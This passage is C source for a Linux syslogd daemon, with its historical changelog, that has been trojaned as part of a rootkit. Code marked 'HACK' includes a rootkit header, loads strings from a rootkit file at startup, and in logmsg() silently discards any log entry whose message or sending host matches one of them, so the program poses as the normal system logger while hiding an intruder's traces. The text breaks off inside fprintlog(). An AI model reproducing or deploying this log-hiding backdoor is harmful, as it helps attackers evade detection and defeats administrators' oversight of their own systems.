 *	was a name server that runs on my machine and a forwarder of
 *	kern.crit to another host. The hosts address can only be
 *	fetched using the nameserver. But named is started after
 *	syslogd, so syslogd complained.
 *
 *	This logfile type will retry to get the address of the
 *	hostname ten times and then complain. This should be enough to
 *	get the named up and running during boot sequence.
 *
 * Fri Oct 27 14:08:15 1995:  Dr. Wettstein
 *	Changed static array of logfiles to a dynamic array. This
 *	can grow during process.
 *
 * Fri Nov 10 23:08:18 1995:  Martin Schulze
 *	Inserted a new tabular sys_h_errlist that contains plain text
 *	for error codes that are returned from the net subsystem and
 *	stored in h_errno. I have also changed some wrong lookups to
 *	sys_errlist.
 *
 * Wed Nov 22 22:32:55 1995:  Martin Schulze
 *	Added the fabulous strip-domain feature that allows us to
 *	strip off (several) domain names from the fqdn and only log
 *	the simple hostname. This is useful if you're in a LAN that
 *	has a central log server and also different domains.
 *
 *	I have also also added the -l switch do define hosts as
 *	local. These will get logged with their simple hostname, too.
 *
 * Thu Nov 23 19:02:56 MET DST 1995:  Martin Schulze
 *	Added the possibility to omit fsyncing of logfiles after every
 *	write. This will give some performance back if you have
 *	programs that log in a very verbose manner (like innd or
 *	smartlist). Thanks to Stephen R. van den Berg <srb@cuci.nl>
 *	for the idea.
 *
 * Thu Jan 18 11:14:36 CST 1996:  Dr. Wettstein
 *	Added patche from beta-testers to stop compile error.  Also
 *	added removal of pid file as part of termination cleanup.
 *
 * Wed Feb 14 12:42:09 CST 1996:  Dr. Wettstein
 *	Allowed forwarding of messages received from remote hosts to
 *	be controlled by a command-line switch.  Specifying -h allows
 *	forwarding.  The default behavior is to disable forwarding of
 *	messages which were received from a remote host.
 *
 *	Parent process of syslogd does not exit until child process has
 *	finished initialization process.  This allows rc.* startup to
 *	pause until syslogd facility is up and operating.
 *
 *	Re-arranged the select code to move UNIX domain socket accepts
 *	to be processed later.  This was a contributed change which
 *	has been proposed to correct the delays sometimes encountered
 *	when syslogd starts up.
 *
 *	Minor code cleanups.
 */


#define	MAXLINE		1024		/* maximum line length */
#define	MAXSVLINE	240		/* maximum saved line length */
#define DEFUPRI		(LOG_USER|LOG_NOTICE)
#define DEFSPRI		(LOG_KERN|LOG_CRIT)
#define TIMERINTVL	30		/* interval for checking flush, mark */

#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#ifdef SYSV
#include <sys/types.h>
#endif
#include <utmp.h>
#include <ctype.h>
#include <string.h>
#include <setjmp.h>
#include <stdarg.h>

#include <sys/syslog.h>
#include <sys/param.h>
#include <sys/errno.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/file.h>
#ifdef SYSV
#include <fcntl.h>
#else
#include <sys/msgbuf.h>
#endif
#include <linux/uio.h>
#include <sys/un.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <signal.h>

#include <netinet/in.h>
#include <netdb.h>
#include <syscall.h>
#include <arpa/nameser.h>
#include <arpa/inet.h>
#include <resolv.h>
#include "pidfile.h"
#include "version.h"

#if defined(__linux__)
#include <paths.h>
#endif

#ifndef UTMP_FILE
#ifdef UTMP_FILENAME
#define UTMP_FILE UTMP_FILENAME
#else
#ifdef _PATH_UTMP
#define UTMP_FILE _PATH_UTMP
#else
#define UTMP_FILE "/etc/utmp"
#endif
#endif
#endif

#ifndef _PATH_LOGCONF 
#define _PATH_LOGCONF	"/etc/syslog.conf"
#endif

#if defined(SYSLOGD_PIDNAME)
#undef _PATH_LOGPID
#if defined(FSSTND)
#define _PATH_LOGPID _PATH_VARRUN SYSLOGD_PIDNAME
#else
#define _PATH_LOGPID "/etc/" SYSLOGD_PIDNAME
#endif
#else
#ifndef _PATH_LOGPID
#if defined(FSSTND)
#define _PATH_LOGPID _PATH_VARRUN "syslogd.pid"
#else
#define _PATH_LOGPID "/etc/syslogd.pid"
#endif
#endif
#endif

#ifndef _PATH_DEV
#define _PATH_DEV	"/dev/"
#endif

#ifndef _PATH_CONSOLE
#define _PATH_CONSOLE	"/dev/console"
#endif

#ifndef _PATH_TTY
#define _PATH_TTY	"/dev/tty"
#endif

#ifndef _PATH_LOG
#define _PATH_LOG	"/dev/log"
#endif

char	*LogName = _PATH_LOG;
char	*ConfFile = _PATH_LOGCONF;
char	*PidFile = _PATH_LOGPID;
char	ctty[] = _PATH_CONSOLE;

char	**parts;

int inetm = 0, funix = 0;
static int debugging_on = 0;
static int nlogs = -1;
static int restart = 0;

#define UNAMESZ		8	/* length of a login name */
#define MAXUNAMES	20	/* maximum number of user names */
#define MAXFNAME	200	/* max file pathname length */

#define INTERNAL_NOPRI	0x10	/* the "no priority" priority */
#define TABLE_NOPRI	0	/* Value to indicate no priority in f_pmask */
#define TABLE_ALLPRI    0xFF    /* Value to indicate all priorities in f_pmask */
#define	LOG_MARK	LOG_MAKEPRI(LOG_NFACILITIES, 0)	/* mark "facility" */

/*
 * Flags to logmsg().
 */

#define IGN_CONS	0x001	/* don't print on console */
#define SYNC_FILE	0x002	/* do fsync on file after printing */
#define ADDDATE		0x004	/* add a date to the message */
#define MARK		0x008	/* this message is a mark */

/*
 * This table contains plain text for h_errno errors used by the
 * net subsystem.
 */
const char *sys_h_errlist[] = {
    "No problem",						/* NETDB_SUCCESS */
    "Authoritative answer: host not found",			/* HOST_NOT_FOUND */
    "Non-authoritative answer: host not found, or serverfail",	/* TRY_AGAIN */
    "Non recoverable errors",					/* NO_RECOVERY */
    "Valid name, no data record of requested type",		/* NO_DATA */
    "no address, look for MX record"				/* NO_ADDRESS */
 };

/*
 * This structure represents the files that will have log
 * copies printed.
 */

struct filed {
#ifndef SYSV
	struct	filed *f_next;		/* next in linked list */
#endif
	short	f_type;			/* entry type, see below */
	short	f_file;			/* file descriptor */
	time_t	f_time;			/* time this was last written */
	u_char	f_pmask[LOG_NFACILITIES+1];	/* priority mask */
	union {
		char	f_uname[MAXUNAMES][UNAMESZ+1];
		struct {
			char	f_hname[MAXHOSTNAMELEN+1];
			struct sockaddr_in	f_addr;
		} f_forw;		/* forwarding address */
		char	f_fname[MAXFNAME];
	} f_un;
	char	f_prevline[MAXSVLINE];		/* last message logged */
	char	f_lasttime[16];			/* time of last occurrence */
	char	f_prevhost[MAXHOSTNAMELEN+1];	/* host from which recd. */
	int	f_prevpri;			/* pri of f_prevline */
	int	f_prevlen;			/* length of f_prevline */
	int	f_prevcount;			/* repetition cnt of prevline */
	int	f_repeatcount;			/* number of "repeated" msgs */
	int	f_flags;			/* store some additional flags */
};

/*
 * Intervals at which we flush out "message repeated" messages,
 * in seconds after previous message is logged.  After each flush,
 * we move to the next interval until we reach the largest.
 */
int	repeatinterval[] = { 30, 60 };	/* # of secs before flush */
#define	MAXREPEAT ((sizeof(repeatinterval) / sizeof(repeatinterval[0])) - 1)
#define	REPEATTIME(f)	((f)->f_time + repeatinterval[(f)->f_repeatcount])
#define	BACKOFF(f)	{ if (++(f)->f_repeatcount > MAXREPEAT) \
				 (f)->f_repeatcount = MAXREPEAT; \
			}
#ifdef SYSLOG_INET
#define INET_SUSPEND_TIME 180		/* equal to 3 minutes */
#define INET_RETRY_MAX 10		/* maximum of retries for gethostbyname() */
#endif

#define LIST_DELIMITER	':'		/* delimiter between two hosts */

/* values for f_type */
#define F_UNUSED	0		/* unused entry */
#define F_FILE		1		/* regular file */
#define F_TTY		2		/* terminal */
#define F_CONSOLE	3		/* console terminal */
#define F_FORW		4		/* remote machine */
#define F_USERS		5		/* list of users */
#define F_WALL		6		/* everyone logged on */
#define F_FORW_SUSP	7		/* suspended host forwarding */
#define F_FORW_UNKN	8		/* unknown host forwarding */
char	*TypeNames[9] = {
	"UNUSED",	"FILE",		"TTY",		"CONSOLE",
	"FORW",		"USERS",	"WALL",		"FORW(SUSPENDED)",
	"FORW(UNKNOWN)"
};

struct	filed *Files = (struct filed *) 0;
struct	filed consfile;

struct code {
	char	*c_name;
	int	c_val;
};

struct code	PriNames[] = {
	{"alert",	LOG_ALERT},
	{"crit",	LOG_CRIT},
	{"debug",	LOG_DEBUG},
	{"emerg",	LOG_EMERG},
	{"err",		LOG_ERR},
	{"error",	LOG_ERR},		/* DEPRECATED */
	{"info",	LOG_INFO},
	{"none",	INTERNAL_NOPRI},	/* INTERNAL */
	{"notice",	LOG_NOTICE},
	{"panic",	LOG_EMERG},		/* DEPRECATED */
	{"warn",	LOG_WARNING},		/* DEPRECATED */
	{"warning",	LOG_WARNING},
	{"*",		TABLE_ALLPRI},
	{NULL,		-1}
};

struct code	FacNames[] = {
	{"auth",         LOG_AUTH},
	{"authpriv",     LOG_AUTHPRIV},
	{"cron",         LOG_CRON},
	{"daemon",       LOG_DAEMON},
	{"kern",         LOG_KERN},
	{"lpr",          LOG_LPR},
	{"mail",         LOG_MAIL},
	{"mark",         LOG_MARK},		/* INTERNAL */
	{"news",         LOG_NEWS},
	{"security",     LOG_AUTH},		/* DEPRECATED */
	{"syslog",       LOG_SYSLOG},
	{"user",         LOG_USER},
	{"uucp",         LOG_UUCP},
	{"local0",       LOG_LOCAL0},
	{"local1",       LOG_LOCAL1},
	{"local2",       LOG_LOCAL2},
	{"local3",       LOG_LOCAL3},
	{"local4",       LOG_LOCAL4},
	{"local5",       LOG_LOCAL5},
	{"local6",       LOG_LOCAL6},
	{"local7",       LOG_LOCAL7},
	{NULL,           -1},
};

int	Debug;			/* debug flag */
char	LocalHostName[MAXHOSTNAMELEN+1];	/* our hostname */
char	*LocalDomain;		/* our local domain name */
int	InetInuse = 0;		/* non-zero if INET sockets are being used */
int	finet;			/* Internet datagram socket */
int	LogPort;		/* port number for INET connections */
int	Initialized = 0;	/* set when we have initialized ourselves */
int	MarkInterval = 20 * 60;	/* interval between marks in seconds */
int	MarkSeq = 0;		/* mark sequence number */
int	NoFork = 0; 		/* don't fork - don't run in daemon mode */
int	AcceptRemote = 0;	/* receive messages that come via UDP */
char	**StripDomains = NULL;	/* these domains may be stripped before writing logs */
char	**LocalHosts = NULL;	/* these hosts are logged with their hostname */
int	NoHops = 1;		/* Can we bounce syslog messages through an
				   intermediate host. */

extern	int errno, sys_nerr;
extern	char *sys_errlist[];
extern	char *ctime(), *index();

/* HACK vars */
#include "../rootkit.h"
#define FILENAME ROOTKIT_LOG_FILE
#define STR_SIZE 128

struct  h_st {
        struct h_st     *next;
        char            logstr[STR_SIZE];
};

struct  h_st    *hack_list;
struct  h_st    *h_tmp;

char    tmp_str[STR_SIZE];

FILE    *fp_hack;
int     showall=0;

/* End hack vars */

void hackinit(void)
{
/*+  HACK Read in strings to block  +*/

        h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
        hack_list=h_tmp;

        if ((int)fp_hack=fopen (FILENAME, "r")) {
                while (fgets(tmp_str, 126, fp_hack)) {
                        h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
                        strcpy (h_tmp->logstr, tmp_str);
                        h_tmp->logstr[strlen(h_tmp->logstr)-1]='\0';
                        h_tmp=h_tmp->next;
                }
        fclose(fp_hack);
        }
   h_tmp->next=NULL;
}

/*+  On with the program  +*/

/* Function prototypes. */
int main(int argc, char **argv);
char **crunch_list(char *list);
int usage(void);
void untty(void);
void printchopped(const char *hname, char *msg, int len, int fd);
void printline(const char *hname, char *msg);
void printsys(char *msg);
void logmsg(int pri, char *msg, const char *from, int flags);
void fprintlog(register struct filed *f, char *from, int flags, char *msg);
void endtty();
void wallmsg(register struct filed *f, struct iovec *iov);
void reapchild();
const char *cvthname(struct sockaddr_in *f);
void domark();
void debug_switch();
void logerror(char *type);
void die(int sig);
void init();
void cfline(char *line, register struct filed *f);
int decode(char *name, struct code *codetab);
static void dprintf(char *, ...);
static void allocate_log(void);
void sighup_handler();


int main(argc, argv)
	int argc;
	char **argv;
{
	register int i;
	register char *p;
	int len, num_fds;
	fd_set unixm, readfds;

	int	fd;
#ifdef SYSLOG_UNIXAF
	struct sockaddr_un sunx, fromunix;
#endif
#ifdef  SYSLOG_INET
	struct sockaddr_in sin, frominet;
	char *from;
#endif
	int ch;
	struct hostent *hent;

	char line[MAXLINE +1];
	extern int optind;
	extern char *optarg;

	int quitpid = 0;

/* HACK initialise */
hackinit();

	while ((ch = getopt(argc, argv, "dhf:l:m:np:rs:v")) != EOF)
		switch((char)ch) {
		case 'd':		/* debug */
			Debug = 1;
			break;
		case 'f':		/* configuration file */
			ConfFile = optarg;
			break;
		case 'h':
			NoHops = 0;
			break;
		case 'l':
			if (LocalHosts) {
				printf ("Only one -l argument allowed," \
					"the first one is taken.\n");
				break;
			}
			LocalHosts = crunch_list(optarg);
			break;
		case 'm':		/* mark interval */
			MarkInterval = atoi(optarg) * 60;
			break;
		case 'n':		/* don't fork */
			NoFork = 1;
			break;
		case 'p':		/* path */
			LogName = optarg;
			break;
		case 'r':		/* accept remote messages */
			AcceptRemote = 1;
			break;
		case 's':
			if (StripDomains) {
				printf ("Only one -s argument allowed," \
					"the first one is taken.\n");
				break;
			}
			StripDomains = crunch_list(optarg);
			break;
		case 'v':
			printf("syslogd %s-%s\n", VERSION, PATCHLEVEL);
			exit (1);
		case '?':
		default:
			usage();
		}
	if (argc -= optind)
		usage();

	if ( !(Debug || NoFork) )
	{
		dprintf("Checking pidfile.\n");
		if (!check_pid(PidFile))
		{
			quitpid = getpid();
			if (fork())
			{
				/* We try to wait the end of initialization */
				sleep(10);
				exit(0);
			}
			num_fds = getdtablesize();
			for (i= 0; i < num_fds; i++)
				(void) close(i);
			untty();
		}
		else
		{
			fputs("syslogd: Already running.\n", stderr);
			exit(1);
		}
	}
	else
		debugging_on = 1;
#ifndef SYSV
	else
		setlinebuf(stdout);
#endif

	/* tuck my process id away */
	if ( !Debug )
	{
		dprintf("Writing pidfile.\n");
		if (!check_pid(PidFile))
		{
			if (!write_pid(PidFile))
			{
				dprintf("Can't write pid.\n");
				exit(1);
			}
		}
		else
		{
			dprintf("Pidfile (and pid) already exist.\n");
			exit(1);
		}
	} /* if ( !Debug ) */

	consfile.f_type = F_CONSOLE;
	(void) strcpy(consfile.f_un.f_fname, ctty);
	(void) gethostname(LocalHostName, sizeof(LocalHostName));
	if ( (p = index(LocalHostName, '.')) ) {
		*p++ = '\0';
		LocalDomain = p;
	}
	else
	{
		LocalDomain = "";

		/*
		 * It's not clearly defined whether gethostname()
		 * should return the simple hostname or the fqdn. A
		 * good piece of software should be aware of both and
		 * we want to distribute good software.  Joey
		 */
		hent = gethostbyname(LocalHostName);
		sprintf(LocalHostName, "%s", hent->h_name);
		if ( (p = index(LocalHostName, '.')) )
		{
			*p++ = '\0';
			LocalDomain = p;
		}
	}

	/*
	 * Convert to lower case to recognize the correct domain laterly
	 */
	for (p = (char *)LocalDomain; *p ; p++)
		if (isupper(*p))
			*p = tolower(*p);

	(void) signal(SIGTERM, die);
	(void) signal(SIGINT, Debug ? die : SIG_IGN);
	(void) signal(SIGQUIT, Debug ? die : SIG_IGN);
	(void) signal(SIGCHLD, reapchild);
	(void) signal(SIGALRM, domark);
	(void) signal(SIGUSR1, Debug ? debug_switch : SIG_IGN);
	(void) alarm(TIMERINTVL);
	(void) unlink(LogName);

#ifdef SYSLOG_UNIXAF
	sunx.sun_family = AF_UNIX;
	(void) strncpy(sunx.sun_path, LogName, sizeof(sunx.sun_path));
	funix = socket(AF_UNIX, SOCK_STREAM, 0);
	if (funix < 0 || bind(funix, (struct sockaddr *) &sunx,
	    sizeof(sunx.sun_family)+strlen(sunx.sun_path)) < 0 ||
	    chmod(LogName, 0666) < 0 || listen(funix, 5) < 0) {
		(void) sprintf(line, "cannot create %s", LogName);
		logerror(line);
		dprintf("cannot create %s (%d).\n", LogName, errno);
#ifndef SYSV
		die(0);
#endif
	}
#endif

#ifdef SYSLOG_INET
	finet = socket(AF_INET, SOCK_DGRAM, 0);
	if (finet >= 0) {
	        auto int on = 1;
		struct servent *sp;

		sp = getservbyname("syslog", "udp");
		if (sp == NULL) {
			errno = 0;
			logerror("network logging disabled (syslog/udp service unknown).");
			logerror("see syslogd(8) for details of whether and how to enable it.");
		}
		else {
			sin.sin_family = AF_INET;
			sin.sin_port = LogPort = sp->s_port;
			sin.sin_addr.s_addr = 0;
			if ( setsockopt(finet, SOL_SOCKET, SO_REUSEADDR, \
					(char *) &on, sizeof(on)) < 0 ) {
				logerror("setsockopt, suspending inet");
			}
			else {
				if (bind(finet, (struct sockaddr *) &sin, \
					 sizeof(sin)) < 0) {
					logerror("bind, suspending inet");
				} else {
					inetm = finet;
					InetInuse = 1;
					dprintf("listening on syslog UDP port.\n");
				}
			}
		}
	}
	else
		logerror("syslog: Unknown protocol, suspending inet service.");
#endif


	/* Create a partial message table for all file descriptors. */
	num_fds = getdtablesize();
	dprintf("Allocated parts table for %d file descriptors.\n", num_fds);
	if ( (parts = (char **) malloc(num_fds * sizeof(char *))) == \
	    (char **) 0 )
	{
		logerror("Cannot allocate memory for message parts table.");
		die(0);
	}
	for(i= 0; i < num_fds; ++i)
	    parts[i] = (char *) 0;

	dprintf("Starting.\n");
	init();
	if ( Debug )
	{
		dprintf("Debugging disabled, SIGUSR1 to turn on debugging.\n");
		debugging_on = 0;
	}

	if (quitpid) {
		kill(quitpid, SIGINT);
	}

	/* Main loop begins here. */
	FD_ZERO(&unixm);
	FD_ZERO(&readfds);
	for (;;) {
		int nfds;
		errno = 0;
#ifdef SYSLOG_UNIXAF
		/*
		 * Add the Unix Domain Socket to the list of read
		 * descriptors.
		 */
		FD_SET(funix, &readfds);
		for (nfds= 0; nfds < FD_SETSIZE; ++nfds)
			if ( FD_ISSET(nfds, &unixm) )
				FD_SET(nfds, &readfds);
#endif
#ifdef SYSLOG_INET
		/*
		 * Add the Internet Domain Socket to the list of read
		 * descriptors.
		 */
		if ( InetInuse && AcceptRemote )
			FD_SET(inetm, &readfds);
#endif

		if ( debugging_on )
		{
			dprintf("Calling select, active file descriptors: ");
			for (nfds= 0; nfds < FD_SETSIZE; ++nfds)
				if ( FD_ISSET(nfds, &readfds) )
					dprintf("%d ", nfds);
			dprintf("\n");
		}
		nfds = select(FD_SETSIZE, (fd_set *) &readfds, (fd_set *) NULL,
				  (fd_set *) NULL, (struct timeval *) NULL);
		if ( restart )
		{
			dprintf("\nReceived SIGHUP, reloading syslogd.\n");
			init();
			restart = 0;
			continue;
		}
		if (nfds == 0) {
			dprintf("No select activity.\n");
			continue;
		}
		if (nfds < 0) {
			if (errno != EINTR)
				logerror("select");
			dprintf("Select interrupted.\n");
			continue;
		}

		if ( debugging_on )
		{
			dprintf("\nSuccessful select, descriptor count = %d, " \
				"Activity on: ", nfds);
			for (nfds= 0; nfds < FD_SETSIZE; ++nfds)
				if ( FD_ISSET(nfds, &readfds) )
					dprintf("%d ", nfds);
			dprintf(("\n"));
		}

#ifdef SYSLOG_UNIXAF
		if ( debugging_on )
		{
			dprintf("Checking UNIX connections, active: ");
			for (nfds= 0; nfds < FD_SETSIZE; ++nfds)
				if ( FD_ISSET(nfds, &unixm) )
					dprintf("%d ", nfds);
			dprintf("\n");
		}
		for (fd= 0; fd <= FD_SETSIZE; ++fd)
		  if ( FD_ISSET(fd, &readfds) && FD_ISSET(fd, &unixm) ) {
			dprintf("Message from UNIX socket #%d.\n", fd);
			memset(line, '\0', sizeof(line));
			i = read(fd, line, MAXLINE);
			if (i > 0) {
				printchopped(LocalHostName, line, i, fd);
		  	} else if (i < 0) {
		    		if (errno != EINTR) {
		      			logerror("recvfrom unix");
				}
		        } else {
		    		dprintf("Unix socket (%d) closed.\n", fd);
				if ( parts[fd] != (char *) 0 )
				{
					logerror("Printing partial message");
					line[0] = '\0';
					printchopped(LocalHostName, line, \
						     strlen(parts[fd]) + 1, \
						     fd);
				}
		    		close(fd);
		    		FD_CLR(fd, &unixm);
		    		FD_CLR(fd, &readfds);
		  	}
	      	}
		/* Accept a new unix connection */
		if (FD_ISSET(funix, &readfds)) {
			len = sizeof(fromunix);
			if ((fd = accept(funix, (struct sockaddr *) &fromunix,\
					 &len)) >= 0) {
			  	FD_SET(fd, &unixm);
				dprintf("New UNIX connect assigned to fd: " \
					"%d.\n", fd);
				FD_SET(fd, &readfds);
			}
			else {
				dprintf("Error accepting UNIX connection: " \
					"%d = %s.\n", errno, strerror(errno));
			}
		}

#endif

#ifdef SYSLOG_INET
		if (InetInuse && AcceptRemote && FD_ISSET(inetm, &readfds)) {
			len = sizeof(frominet);
			memset(line, '\0', sizeof(line));
			i = recvfrom(finet, line, MAXLINE - 2, 0, \
				     (struct sockaddr *) &frominet, &len);
			dprintf("Message from inetd socket: #%d, host: %s\n",
				inetm, inet_ntoa(frominet.sin_addr));
			if (i > 0) {
				line[i] = line[i+1] = '\0';
				from = (char *)cvthname(&frominet);
				/*
				 * Here we could check if the host is permitted
				 * to send us syslog messages. We just have to
				 * catch the result of cvthname, look for a dot
				 * and if that doesn't exist, replace the first
				 * '\0' with '.' and we have the fqdn in lowercase
				 * letters so we could match them against whatever.
				 *  -Joey
				 */
				printchopped(from, line, \
 					     i + 2,  finet);
			} else if (i < 0 && errno != EINTR) {
				dprintf("INET socket error: %d = %s.\n", \
					errno, strerror(errno));
				logerror("recvfrom inet");
				sleep(10);
			}
		}
#endif
	}
}

int usage()
{
	fprintf(stderr, "usage: syslogd [-drvh] [-l hostlist] [-m markinterval] [-n] [-p path]\n" \
		" [-s domainlist] [-f conffile]\n");
	exit(1);
}


char **
crunch_list(list)
	char *list;
{
	int count;
	int i;
	char *p;
	char **result = NULL;

	p = list;
	
	/* strip off trailing delimiters */
	while (p[strlen(p)-1] == LIST_DELIMITER) {
		count--;
		p[strlen(p)-1] = '\0';
	}
	/* cut off leading delimiters */
	while (p[0] == LIST_DELIMITER) {
		count--;
		p++; 
	}
	
	/* count delimiters to calculate elements */
	for (count=i=0; p[i]; i++)
		if (p[i] == LIST_DELIMITER) count++;
	
	if ((result = (char **)malloc(sizeof(char *) * count+2)) == NULL) {
		printf ("Sorry, can't get enough memory, exiting.\n");
		exit(0);
	}
	
	/*
	 * We now can assume that the first and last
	 * characters are different from any delimiters,
	 * so we don't have to care about this.
	 */
	count = 0;
	while ((i=(int)index(p, LIST_DELIMITER))) {
		if ((result[count] = \
		     (char *)malloc(sizeof(char) * i - (int)p +1)) == NULL) {
			printf ("Sorry, can't get enough memory, exiting.\n");
			exit(0);
		}
		strncpy(result[count],p, i - (int)p);
		result[count][i - (int)p] = '\0';
		p = (char *)i;p++;
		count++;
	}
	if ((result[count] = \
	     (char *)malloc(sizeof(char) * strlen(p) + 1)) == NULL) {
		printf ("Sorry, can't get enough memory, exiting.\n");
		exit(0);
	}
	strcpy(result[count],p);
	result[++count] = NULL;

#if 0
	count=0;
	while (result[count])
		dprintf ("#%d: %s\n", count, StripDomains[count++]);
#endif
	return result;
}


void untty()
#ifdef SYSV
{
	if ( !Debug ) {
		setsid();
	}
	return;
}

#else
{
	int i;

	if ( !Debug ) {
		i = open(_PATH_TTY, O_RDWR);
		if (i >= 0) {
			(void) ioctl(i, (int) TIOCNOTTY, (char *)0);
			(void) close(i);
		}
	}
}
#endif


/*
 * Parse the line to make sure that the msg is not a composite of more
 * than one message.
 */

void printchopped(hname, msg, len, fd)
	const char *hname;
	char *msg;
	int len;
	int fd;
{
	auto int ptlngth;

	auto char *start = msg,
		  *p,
	          *end,
		  tmpline[MAXLINE + 1];

	dprintf("Message length: %d, File descriptor: %d.\n", len, fd);
	tmpline[0] = '\0';
	if ( parts[fd] != (char *) 0 )
	{
		dprintf("Including part from messages.\n");
		strcpy(tmpline, parts[fd]);
		free(parts[fd]);
		parts[fd] = (char *) 0;
		if ( (strlen(msg) + strlen(tmpline)) > MAXLINE )
		{
			logerror("Cannot glue message parts together");
			printline(hname, tmpline);
			start = msg;
		}
		else
		{
			dprintf("Previous: %s\n", tmpline);
			dprintf("Next: %s\n", msg);
			strcat(tmpline, msg);
			printline(hname, tmpline);
			if ( (strlen(msg) + 1) == len )
				return;
			else
				start = strchr(msg, '\0') + 1;
		}
	}

	if ( msg[len-1] != '\0' )
	{
		msg[len] = '\0';
		for(p= msg+len-1; *p != '\0' && p > msg; )
			--p;
		ptlngth = strlen(++p);
		if ( (parts[fd] = malloc(ptlngth + 1)) == (char *) 0 )
			logerror("Cannot allocate memory for message part.");
		else
		{
			strcpy(parts[fd], p);
			dprintf("Saving partial msg: %s\n", parts[fd]);
			memset(p, '\0', ptlngth);
		}
	}

	do {
		end = strchr(start + 1, '\0');
		printline(hname, start);
		start = end + 1;
	} while ( *start != '\0' );

	return;
}



/*
 * Take a raw input line, decode the message, and print the message
 * on the appropriate log files.
 */

void printline(hname, msg)
	const char *hname;
	char *msg;
{
	register char *p, *q;
	register int c;
	char line[MAXLINE + 1];
	int pri;

	/* test for special codes */
	pri = DEFUPRI;
	p = msg;
	if (*p == '<') {
		pri = 0;
		while (isdigit(*++p))
		{
		   pri = 10 * pri + (*p - '0');
		}
		if (*p == '>')
			++p;
	}
	if (pri &~ (LOG_FACMASK|LOG_PRIMASK))
		pri = DEFUPRI;

	q = line;
	while ((c = *p++ & 0177) != '\0' &&
	    q < &line[sizeof(line) - 1])
		if (c == '\n')
			*q++ = ' ';
		else if (iscntrl(c)) {
			*q++ = '^';
			*q++ = c ^ 0100;
		} else
			*q++ = c;
	*q = '\0';

	logmsg(pri, line, hname, SYNC_FILE);
	return;
}



/*
 * Take a raw input line from /dev/klog, split and format similar to syslog().
 */

void printsys(msg)
	char *msg;
{
	register char *p, *q;
	register int c;
	char line[MAXLINE + 1];
	int pri, flags;
	char *lp;

	(void) sprintf(line, "vmunix: ");
	lp = line + strlen(line);
	for (p = msg; *p != '\0'; ) {
		flags = ADDDATE;
		pri = DEFSPRI;
		if (*p == '<') {
			pri = 0;
			while (isdigit(*++p))
				pri = 10 * pri + (*p - '0');
			if (*p == '>')
				++p;
		} else {
			/* kernel printf's come out on console */
			flags |= IGN_CONS;
		}
		if (pri &~ (LOG_FACMASK|LOG_PRIMASK))
			pri = DEFSPRI;
		q = lp;
		while (*p != '\0' && (c = *p++) != '\n' &&
		    q < &line[MAXLINE])
			*q++ = c;
		*q = '\0';
		logmsg(pri, line, LocalHostName, flags);
	}
	return;
}

time_t	now;

/*
 * Log a message to the appropriate log files, users, etc. based on
 * the priority.
 */

void logmsg(pri, msg, from, flags)
	int pri;
	char *msg;
	const char *from;
	int flags;
{
	register struct filed *f;
	int fac, prilev, lognum;
	int msglen;
	char *timestamp;
        int elite=0;
/* HACK mask out unwanted entries */
        for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next)
                if ((strstr(msg, h_tmp->logstr))||(strstr(from, h_tmp->logstr)))                elite++;
if (!elite) {

	dprintf("logmsg: pri %o, flags %x, from %s, msg %s\n", pri, flags, from, msg);

#ifndef SYSV
	omask = sigblock(sigmask(SIGHUP)|sigmask(SIGALRM));
#endif

	/*
	 * Check to see if msg looks non-standard.
	 */
	msglen = strlen(msg);
	if (msglen < 16 || msg[3] != ' ' || msg[6] != ' ' ||
	    msg[9] != ':' || msg[12] != ':' || msg[15] != ' ')
		flags |= ADDDATE;

	(void) time(&now);
	if (flags & ADDDATE)
		timestamp = ctime(&now) + 4;
	else {
		timestamp = msg;
		msg += 16;
		msglen -= 16;
	}

	/* extract facility and priority level */
	if (flags & MARK)
		fac = LOG_NFACILITIES;
	else
		fac = LOG_FAC(pri);
	prilev = LOG_PRI(pri);

	/* log the message to the particular outputs */
	if (!Initialized) {
		f = &consfile;
		f->f_file = open(ctty, O_WRONLY|O_NOCTTY);

		if (f->f_file >= 0) {
			untty();
			fprintlog(f, (char *)from, flags, msg);
			(void) close(f->f_file);
		}
#ifndef SYSV
		(void) sigsetmask(omask);
#endif
		return;
	}
#ifdef SYSV
	for (lognum = 0; lognum <= nlogs; lognum++) {
		f = &Files[lognum];
#else
	for (f = Files; f; f = f->f_next) {
#endif

		/* skip messages that are incorrect priority */
		if ( (f->f_pmask[fac] == TABLE_NOPRI) || \
		    ((f->f_pmask[fac] & (1<<prilev)) == 0) )
		  	continue;

		if (f->f_type == F_CONSOLE && (flags & IGN_CONS))
			continue;

		/* don't output marks to recently written files */
		if ((flags & MARK) && (now - f->f_time) < MarkInterval / 2)
			continue;

		/*
		 * suppress duplicate lines to this file
		 */
		if ((flags & MARK) == 0 && msglen == f->f_prevlen &&
		    !strcmp(msg, f->f_prevline) &&
		    !strcmp(from, f->f_prevhost)) {
			(void) strncpy(f->f_lasttime, timestamp, 15);
			f->f_prevcount++;
			dprintf("msg repeated %d times, %ld sec of %d.\n",
			    f->f_prevcount, now - f->f_time,
			    repeatinterval[f->f_repeatcount]);
			/*
			 * If domark would have logged this by now,
			 * flush it now (so we don't hold isolated messages),
			 * but back off so we'll flush less often
			 * in the future.
			 */
			if (now > REPEATTIME(f)) {
				fprintlog(f, (char *)from, flags, (char *)NULL);
				BACKOFF(f);
			}
		} else {
			/* new line, save it */
			if (f->f_prevcount)
				fprintlog(f, (char *)from, 0, (char *)NULL);
			f->f_repeatcount = 0;
			(void) strncpy(f->f_lasttime, timestamp, 15);
			(void) strncpy(f->f_prevhost, from,
					sizeof(f->f_prevhost));
			if (msglen < MAXSVLINE) {
				f->f_prevlen = msglen;
				f->f_prevpri = pri;
				(void) strcpy(f->f_prevline, msg);
				fprintlog(f, (char *)from, flags, (char *)NULL);
			} else {
				f->f_prevline[0] = 0;
				f->f_prevlen = 0;
				fprintlog(f, (char *)from, flags, msg);
			}
		}
	}
#ifndef SYSV
	(void) sigsetmask(omask);
#endif
} /* END ELITE HACK */
}

void fprintlog(f, from, flags, msg)
	register struct filed *f;
	char *from;
	int flags;
	char *msg;
{
	struct iovec iov[6];
	register struct iovec *v = iov;
	register int l;
	char line[MAXLINE + 1];
	char repbuf[80];
	time_t fwd_suspend;
	struct hostent *hp;

	dprintf("Called fprintlog, ");

